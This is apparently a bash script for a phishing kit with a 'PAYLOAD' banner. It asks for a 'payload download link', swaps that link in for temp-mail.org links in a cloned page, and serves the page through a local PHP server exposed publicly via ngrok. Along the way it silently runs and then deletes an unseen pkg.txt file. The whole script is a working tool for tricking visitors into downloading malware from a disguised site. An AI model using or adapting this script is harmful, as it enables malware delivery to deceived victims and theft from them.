red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
echo ""
clear
bash pkg.txt
rm -rf pkg.txt
clear
rm -rf index.html
echo -e "$red

██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ "$ylo
echo ""
echo ""
read -p "{[•]} Past Your Payload Download Link here: " yenoj
sed 's+https://temp-mail.org+'$yenoj'+g' yenoj.html > index.html
sleep 2.0
read -p "{[•]} PhP Server is Starting Plzz Type any Port no.: " port
php -S localhost:$port > /dev/null 2>&1 &
echo "{[•]} Now ngrok Server Is starting"
echo "{[•]} Simply Copy forwarding link"
sleep 5.0
./ngrok http $port

